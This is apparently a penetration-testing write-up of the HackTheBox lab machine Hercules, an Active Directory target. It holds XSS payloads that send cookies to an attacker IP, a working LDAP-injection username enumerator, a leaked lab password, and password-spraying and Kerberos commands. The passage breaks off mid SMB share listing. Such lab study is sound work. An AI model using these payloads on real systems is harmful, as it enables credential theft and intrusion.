- - - 
created : 18-10-2025 

Tags : #insane 

Released on 18 Oct 2025 (Season 9)
- - - 
# Machine Information

The root flag can be found in the non-default location, C:\Users\Admin\Desktop.
# Hints / Paths

**User flag**

```rust
├─ initial web + LDAP injection → credential extraction (username/description)
│  └─ credential reuse → ken.w → web app compromise → disclose config → app keys → forge admin cookie
│     └─ web-admin → upload & harvest NTLM hash → obtain natalie.a creds
├─ natalie.a → shadow/impersonate bob.w
│  └─ bob.w → move auditor to Web Department OU
│     └─ natalie.a → dump auditor hash and winrm
```

**Root flag**

```rust
Auditor
├─ grant elevated rights in Forest Migration OU
├─ enable & take over fernando.r
│  └─ fernando.r → esc3 → ashley.b
├─ (as Auditor) grant IT Support GA on Forest Migration OU
├─ (as ashley.b) view and trigger scheduled task → adminCount removed from iis_administrator
├─ regrant Auditor rights → enable iis_administrator
│  └─ iis_administrator → reset iis_webserver password
└─ iis_webserver → spnless RBCD → Administrator 
```
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ rustscan -a hercules.htb -- -A

Open 10.10.11.91:53
Open 10.10.11.91:80
Open 10.10.11.91:88
Open 10.10.11.91:135
Open 10.10.11.91:139
Open 10.10.11.91:389
Open 10.10.11.91:443
Open 10.10.11.91:445
Open 10.10.11.91:464
Open 10.10.11.91:593
Open 10.10.11.91:636
Open 10.10.11.91:3268
Open 10.10.11.91:3269
Open 10.10.11.91:5986
Open 10.10.11.91:9389
Open 10.10.11.91:49664
Open 10.10.11.91:49668
Open 10.10.11.91:49670
Open 10.10.11.91:49677
Open 10.10.11.91:51733
Open 10.10.11.91:51762
Open 10.10.11.91:61659

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to https://hercules.htb/
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-18 19:04:10Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb

443/tcp   open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0
 http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Hercules Corp

445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)

3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack ttl 127
5986/tcp  open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51733/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51762/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61659/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

Running (JUST GUESSING): Microsoft Windows 2022|2012 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%)

```

This is a [Active Directory](../../../3%20-%20Tags/Hacking%20Concepts/Active%20Directory.md) environment, you can check [Intro to Active Directory Theory](../Academy/Intro%20to%20Active%20Directory%20Theory.md)  and better understand all processes.

Let's add `dc.hercules.htb` to `/etc/hosts`.
# Enumeration
## SMB (135,139,445) 

We check if anonymous access is enabled on [SMB](../../../3%20-%20Tags/Hacking%20Concepts/SMB.md) using `nxc`:

```bash
└─$ nxc smb dc.hercules.htb                    
SMB         10.10.11.91     445    10.10.11.91      [*]  x64 (name:10.10.11.91) (domain:10.10.11.91) (signing:True) (SMBv1:False) (NTLM:False)

└─$netexec smb 10.10.11.91 -u guest -p '' --shares
SMB         10.10.11.91     445    10.10.11.91      [-] 10.10.11.91\guest: STATUS_NOT_SUPPORTED
```

No.
## HTTP - Kerberos (80/88/443)

Interesting for session cookies:

![Pasted image 20251018210257.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251018210257.png)
### Dirsearch

Found the login panel:

![Pasted image 20251018210648.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251018210648.png)
### Kerbrute

We can start to enumerate users on system with kerberos  (88), found `auditor` , `admin`  and `administrator` with [Kerbrute](../../../3%20-%20Tags/Hacking%20Tools/Kerbrute.md) and `xato` list:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ ./kerbrute userenum --dc 10.10.11.91 -d hercules.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/19/25 - Ronnie Flathers @ropnop

  Using KDC(s):
  10.10.11.91:88

[+] VALID USERNAME:       admin@hercules.htb
[+] VALID USERNAME:       administrator@hercules.htb
[+] VALID USERNAME:       Admin@hercules.htb
[+] VALID USERNAME:       Administrator@hercules.htb
[+] VALID USERNAME:       auditor@hercules.htb
[+] VALID USERNAME:       ADMIN@hercules.htb
```

And using `john.smith.txt` we find `ashley.b` , `heather.s` and `mark.s`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ ./kerbrute userenum --dc 10.10.11.91 -d hercules.htb /usr/share/wordlists/john.smith.txt

	[+] VALID USERNAME:       ashley.b@hercules.htb
	[+] VALID USERNAME:       heather.s@hercules.htb
	[+] VALID USERNAME:       mark.s@hercules.htb
Done! Tested 248231 usernames (3 valid) in 1058.419 seconds
```

We can try a [Bruteforcing](../../../3%20-%20Tags/Hacking%20Concepts/Bruteforcing.md) attack for passwords:

```bash
─$ ./kerbrute bruteuser --dc 10.10.11.91 -d hercules.htb /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt ashley.b
```

Probably not the way on an INSANE machine, but we have some valid users now.
### TimeRoasting

https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/TimeRoasting.html

We use `timeroast.py` to get `ntp` hashes, can be used to obtain trust account hashes so we try:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ git clone https://github.com/SecuraBV/Timeroast.git  

─$ python3 Timeroast/timeroast.py 10.10.11.91 | tee ntp-hashes.txt     
1000:$sntp-ms$ HTB{REDACTED_HASH}
```

We can try to crack it with [Hashcat](../../../3%20-%20Tags/Hacking%20Tools/Hashcat.md) (remove the RID):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ hashcat -a 0 -m 31300 ntp-hashes.txt /usr/share/wordlists/rockyou.txt 
```

Wasn't able to crack the hash, not the way in.
### GetUserSPNs.py

We can try this command to get `SPNs` without passwords:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ GetUserSPNs.py hercules.htb/username:password -dc-ip 10.10.11.91 -no-preauth True -usersfile users.txt    
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[-] Principal: admin@hercules.htb - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Administrator@hercules.htb - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: auditor@hercules.htb - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: ashley.b@hercules.htb - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: heather.s@hercules.htb - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: mark.s@hercules.htb - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

Fail.
## Trying XSS

We try [Cross-site Scripting (XSS)](../../../3%20-%20Tags/Hacking%20Concepts/Cross-site%20Scripting%20(XSS).md) on the `Drop us a message` form with this [Payload](../../../3%20-%20Tags/Hacking%20Concepts/Payload.md):

```xml
<img src=x onerror=this.src="http://10.10.14.146/?c="+document.cookie>
<img src=x onerror="location.href='http://10.10.14.146/?c='+ document.cookie">
<script>new Image().src="http://10.10.14.146/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://10.10.14.146/?c="+escape(document.cookie);</script>
<script>location.href = 'http://10.10.14.146/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://10.10.14.146/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://10.10.14.146/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://10.10.14.146/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://10.10.14.146?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://10.10.14.146/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://10.10.14.146/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://10.10.14.146/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://10.10.14.146?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://10.10.14.146>/?c="+document.cookie</script>
<script>window.location="https://10.10.14.146/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://10.10.14.146/?c="%2Bdocument.cookie, true);xhttp.send();</script>
```

Not working. If we intercept the request with [Caido](../../../3%20-%20Tags/Hacking%20Tools/Caido.md) or [BurpSuite](../../../3%20-%20Tags/Hacking%20Tools/BurpSuite.md) and look at the response we see HttpOnly is set when gives us the cookie on `GET` .

**HttpOnly**: This avoids the **client** to access the cookie (Via **Javascript** for example: `document.cookie`) so no XSS.
## LDAP (389)

We check the guest access:

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ nxc ldap dc.hercules.htb -u '' -p '' 

LDAP        10.10.11.91     389    DC               [*] None (name:DC) (domain:hercules.htb)
LDAP        10.10.11.91     389    DC               [-] hercules.htb\: STATUS_NOT_SUPPORTED
```
### Spotting the vulnerability

Looking at the different responses when try to login we can see this:

```go
username = a => Invalid login attempt
username = a" => Invalid Username
username = auditor - Login attempt failed
```

When a user exist the response is `Login attempt failed`, maybe we can use this to enumerate all the users and maybe find some passwords.
# Exploit - LDAP Injection

The login page contains a critical `LDAP` injection vulnerability.  If we look at the responses again we can find in the code the input validation:

```html
data-val-regex-pattern="^[^!&quot;#&amp;&#39;()*+,\:;&lt;=>?[\]^`{|}~]+$"
```

**Critical Omissions:** The blacklist fails to block essential `LDAP` metacharacters:
- `*` (wildcard character)
- `&` and `|` (logical operators)

**Step 1: Initial Testing** Testing `*` as username confirmed **LDAP** **injection** through differential response analysis.

**Step 2: Boolean-Based Enumeration**
- Valid prefixes returns "Login attempt failed"
- Invalid prefixes produces different responses
- Backend likely performs: `(&(objectClass=user)(sAMAccountName=INPUT))`

**Step 3: Automated Username Enumeration**

So we can perform `LDAP` injection with double URL on login to extract usernames:

```python
#!/usr/bin/env python3
"""
Async LDAP username enumerator with parallel requests.
- Fetches fresh token/cookie before EVERY POST request
- Uses BFS approach with parallel character testing at each level
- Uses httpx for async requests
- Finds complete usernames efficiently

Requires: httpx
pip install httpx
"""

import asyncio
import httpx
import re
from collections import deque
from urllib.parse import quote
import time

# ---------------------------
# Config (edit for your target)
# ---------------------------
BASE = "https://10.10.11.91"        # base URL (scheme + host)
LOGIN_PATH = "/Login"               # POST target path
LOGIN_PAGE = "/login"               # GET page to retrieve token/cookie
TARGET_URL = BASE + LOGIN_PATH      # full POST URL
VERIFY_TLS = False                  # True if cert valid
USERNAME_FIELD = "Username"
PASSWORD_FIELD = "Password"
REMEMBER_FIELD = "RememberMe"
CSRF_FORM_FIELD = "__RequestVerificationToken"  # form field name for token
CSRF_COOKIE_NAME = "__RequestVerificationToken"

# POST settings
PASSWORD_TO_SEND = "test"
DOUBLE_URL_ENCODE = True   # Set True if you need double-encoding behavior

# Async settings
CONCURRENT_REQUESTS = 5     # Lower concurrency since we need fresh tokens
REQUEST_DELAY = 0.2         # Delay between batches to be polite

# BFS / charset
CHARSET = list("abcdefghijklmnopqrstuvwxyz0123456789.-_@")
MAX_USERNAME_LENGTH = 64    # safety limit to prevent infinite loops
VERBOSE = False

# Success indicator (valid user, wrong password)
SUCCESS_INDICATOR = "Login attempt failed"

# Simple regex to extract hidden input token
TOKEN_RE = re.compile(r'name=["\']{}["\']\s+type=["\']hidden["\']\s+value=["\']([^"\']+)["\']'.format(re.escape(CSRF_FORM_FIELD)), re.IGNORECASE)


class LDAPEnumerator:
    def __init__(self):
        self.valid_users = set()
        
    def prepare_username_value(self, username: str, use_wildcard: bool = False) -> str:
        """Prepare username for sending with optional wildcard and encoding"""
        username = username
        if use_wildcard:
            username = username + '*'
        
        if not DOUBLE_URL_ENCODE:
            return username
        
        # Double-encode if needed
        username = ''.join(f'%{byte:02X}' for byte in username.encode('utf-8'))
        return username
        # return quote(username, safe="")
    
    async def fetch_token_and_cookie(self, client):
        """GET the login page and extract CSRF token and cookies"""
        url = BASE + LOGIN_PAGE
        
        try:
            response = await client.get(url)
            token = None
            cookies = {}
            
            # Get cookies from response
            cookies = dict(response.cookies)
            
            # Try to get token from cookie first
            if CSRF_COOKIE_NAME in response.cookies:
                token = response.cookies[CSRF_COOKIE_NAME]
                if VERBOSE:
                    print(f"[i] Got token from cookie: {token[:10]}...")
            
            # Try to parse from HTML
            match = TOKEN_RE.search(response.text)
            if match:
                token = match.group(1)
                if VERBOSE:
                    print(f"[i] Parsed token from HTML: {token[:10]}...")
            
            return token, cookies
            
        except Exception as e:
            print(f"[!] Error fetching token: {e}")
            return None, {}
    
    async def test_single_username(self, username: str, use_wildcard: bool = False):
        """
        Test a single username with fresh token/cookie for each request
        """
        async with httpx.AsyncClient(
            verify=VERIFY_TLS,
            headers={
                "User-Agent": "pentest-enum/1.0",
                "Referer": BASE + LOGIN_PAGE,
                "Origin": BASE,
                "Content-Type": "application/x-www-form-urlencoded",
            },
            timeout=30.0,
            # proxy="http://127.0.0.1:8080"  # Adjust or remove if not using a proxy
        ) as client:
            
            # Step 1: Get fresh token and cookies
            token, cookies = await self.fetch_token_and_cookie(client)
            if not token:
                print(f"[!] Could not get token for '{username}', skipping")
                return False
            
            # Step 2: Prepare the POST request with fresh token and cookies
            username_payload = self.prepare_username_value(username, use_wildcard)
            
            data = {
                USERNAME_FIELD: username_payload,
                PASSWORD_FIELD: PASSWORD_TO_SEND,
                REMEMBER_FIELD: "false",
                CSRF_FORM_FIELD: token
            }
            
            try:
                # Make POST request with fresh token and cookies
                response = await client.post(
                    TARGET_URL, 
                    data=data,
                    cookies=cookies,
                    follow_redirects=False
                )
                
                if 'appp' in response.text.lower():
                    print(f"skipping apppool account")
                    return False

                is_valid = SUCCESS_INDICATOR in response.text
                
                if VERBOSE:
                    status = "VALID" if is_valid else "invalid"
                    wildcard = " (*)" if use_wildcard else ""
                    print(f"[>] {username:20} -> {status}{wildcard}")
                
                return is_valid
                
            except Exception as e:
                # if VERBOSE:
                print(f"[!] Request failed for '{username}': {e}")
                return False
    
    async def test_username_batch(self, usernames, use_wildcard=False):
        """
        Test a batch of usernames in parallel, each with its own fresh token/cookie
        """
        if not usernames:
            return {}
        
        # Use semaphore to limit concurrency
        semaphore = asyncio.Semaphore(CONCURRENT_REQUESTS)
        
        async def bounded_test(username):
            async with semaphore:
                return username, await self.test_single_username(username, use_wildcard)
        
        # Create tasks for all usernames
        tasks = [bounded_test(username) for username in usernames]
        
        # Execute all tasks concurrently
        results_list = await asyncio.gather(*tasks)
        
        # Convert to dictionary
        results = {username: is_valid for username, is_valid in results_list}
        return results
    
    async def discover_first_characters(self):
        """Discover which first characters are valid by testing all charset in parallel"""
        print(f"[*] Testing first characters: {''.join(CHARSET)}")
        
        # Test all possible first characters in parallel
        first_chars = [char for char in CHARSET]
        results = await self.test_username_batch(first_chars, use_wildcard=True)
        
        # Return characters that produced valid results
        valid_chars = [char for char in first_chars if results.get(char, False)]
        print(f"[+] Valid first characters: {''.join(valid_chars)}")
        return valid_chars
    
    async def extend_username(self, prefix):
        """Extend a username prefix by testing all next characters in parallel"""
        if len(prefix) >= MAX_USERNAME_LENGTH:
            return []
        
        candidates = [prefix + char for char in CHARSET]
        results = await self.test_username_batch(candidates, use_wildcard=True)
        
        valid_extensions = [candidate for candidate in candidates if results.get(candidate, False)]
        return valid_extensions
    
    async def verify_exact_username(self, username):
        """Verify that a username is valid without wildcard"""
        result = await self.test_single_username(username, use_wildcard=False)
        return result
    
    async def bfs_discover(self):
        """Main BFS discovery with parallel character testing"""
        print("[*] Starting parallel BFS username discovery...")
        
        # Start with discovering valid first characters
        queue = deque(await self.discover_first_characters())
        discovered_prefixes = set(queue)
        complete_usernames = set()
        
        level = 0
        
        while queue:
            level += 1
            current_level_size = len(queue)
            print(f"\n[*] Level {level}: testing {current_level_size} prefixes {set(queue)}")
            next_level = []
            
            # Process current level in batches
            batch_size = CONCURRENT_REQUESTS
            for i in range(0, len(queue), batch_size):
                batch = list(queue)[i:i + batch_size]
                
                # Test all extensions for this batch in parallel
                extension_tasks = [self.extend_username(prefix) for prefix in batch]
                extension_results = await asyncio.gather(*extension_tasks)
                
                # Process extension results
                for prefix, extensions in zip(batch, extension_results):
                    if not extensions:
                        # No extensions found, this might be a complete username
                        print(f"[+] testing username: {prefix}")
                        if await self.verify_exact_username(prefix):
                            if prefix not in complete_usernames:
                                complete_usernames.add(prefix)
                                print(f"[+] Found valid username: {prefix}")
                    else:
                        # Add valid extensions to next level
                        for extension in extensions:
                            if extension not in discovered_prefixes:
                                discovered_prefixes.add(extension)
                                next_level.append(extension)
                
                # Small delay between batches to be polite
                await asyncio.sleep(REQUEST_DELAY)
            
            # Update queue for next level
            queue = deque(next_level)
            
            if VERBOSE and queue:
                print(f"[*] Level {level} complete. Next level: {len(queue)} prefixes")
                print(f"[*] Valid usernames so far: {sorted(complete_usernames)}")
            
            # Safety check
            if level > MAX_USERNAME_LENGTH:
                print("[!] Reached maximum depth, stopping")
                break
        
        return sorted(complete_usernames)


async def main():
    enumerator = LDAPEnumerator()
    
    try:
        results = await enumerator.bfs_discover()
        
        print("\n" + "="*50)
        print("DISCOVERY COMPLETE")
        print("="*50)
        if results:
            print(f"Found {len(results)} valid usernames:")
            for username in results:
                print(f"  - {username}")
        else:
            print("No valid usernames found.")
            
    except Exception as e:
        print(f"[!] Error during discovery: {e}")


if __name__ == "__main__":
    asyncio.run(main())
```

Use users to `LDAP` inject on description field which holds a long password (use a script again):

```python
└─$ go run script.go

admin: <no description>
administrator: <no description>
adriana.i: <no description>
angelo.o: <no description>
anthony.r: <no description>
ashley.b: <no description>
auditor: <no description>
bob.w: <no description>
camilla.b: <no description>
clarissa.c: <no description>
elijah.m: <no description>
fernando.r: <no description>
fiona.c: <no description>
harris.d: <no description>
heather.s: <no description>
jacob.b: <no description>
james.s: <no description>
jennifer.a: <no description>
jessica.e: <no description>
joel.c: <no description>
johanna.f: <no description>
johnathan.j:              HTB{REDACTED_PASSWD}
ken.w: <no description>
mark.s: <no description>
mikayla.a: <no description>
natalie.a: <no description>
nate.h: <no description>
patrick.s: <no description>
ramona.l: <no description>
ray.n: <no description>
rene.s: <no description>
shae.j: <no description>
stephanie.w: <no description>
stephen.m: <no description>
tanya.r: <no description>
taylor.m: <no description>
tish.c: <no description>
web_admin: <no description>
will.s: <no description>
winda.s: <no description>
zeke.s: <no description>

=== RESULTS ===
johnathan.j:change*th1s_p@ssw()rd!!
```

We have a password now.
## Password spraying

We can't login as `johnathan.j` on web page so we try a password spraying attack on other users with  [Caido](../../../3%20-%20Tags/Hacking%20Tools/Caido.md):

![Pasted image 20251020122403.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251020122403.png)

And login as `ken.w`:

![Pasted image 20251020122628.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251020122628.png)

Can't upload as this user.
## Ticket

Now we can request a ticket:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ impacket-getTGT hercules.htb/'ken.w':' HTB{REDACTED_PASSWD}'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ken.w.ccache

─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Hercules/user/ken.w.ccache
```
## Bloodhound

We can collect for [Bloodhound](../../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ bloodhound-python -u 'ken.w' -p ' HTB{REDACTED_PASSWD}' -d hercules.htb -ns 10.10.11.91 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hercules.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 49 users
INFO: Found 62 groups
INFO: Found 2 gpos
INFO: Found 9 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.hercules.htb
INFO: Done in 00M 10S
INFO: Compressing output into 20251020124509_bloodhound.zip
```

Open GUI:

![Pasted image 20251020125844.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251020125844.png)

No interesting paths for `ken.w`.
# Lateral Movement -Privilege Escalation
## Ken.w to web_admin
### SMB Access

Now we can get a shell on [SMB](../../../3%20-%20Tags/Hacking%20Concepts/SMB.md) to enumerate more:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Hercules/user]
└─$ impacket-smbclient -k dc.hercules.htb                 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Department
IPC$
NETLOGON
Reports
SYSVOL
Users
# use Department
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use Reports
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use Users
# ls
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 .
drw-rw-rw-          0  Wed Dec  4 02:45:11 2024 ..
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 Administrator
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 adriana.i
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 alastair.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 amarnath.r
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 angelo.o
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 anthony.r
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 aravind.r
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 ashiqul.i
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 ashley.b
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 auditor
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 awadhesh.k
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 barun.k
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 bhupendra.p
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 bob.w
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 brady.j
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 camilla.b
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 candi.j
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 charlene.h
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 clarissa.c
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 dale.f
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 declan.k
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 dharminder.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 dolores.r
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 ehab.m
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 elijah.m
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 esraa.h
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 fatih.y
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 fernando.r
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 fiona.c
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 friar.l
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 giang.v
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 Guest
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 gulzar.h
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 hani.k
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 harris.d
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 head.h
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 heather.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 horace.w

drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 iis_administrator
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 iis_apppoolidentity$
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 iis_defaultapppool$
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 iis_hadesapppool$
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 iis_webserver$

drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 inam.u
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 jacob.b
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 james.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 janzen.c
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 jennifer.a
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 jessica.e
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 joel.c
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 johanna.f
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 johnathan.j
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 jyoti.c
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 karrie.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 ken.w
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 kerrie.b
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 koala.b
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 krbtgt
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 kyla.w
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 leighton.j
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 lo.l
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 madhur.j
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 manas.m
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 marivic.g
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 mark.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 megha.d
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 mikayla.a
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 milica.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 mohin.u
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 mukta.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 namrata.j
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 natalie.a
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 nate.h
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 neha.f
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 nischal.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 omar.h
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 pasha.k
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 patrick.s
drw-rw-rw-          0  Wed Dec  4 02:45:12 2024 pitt.b
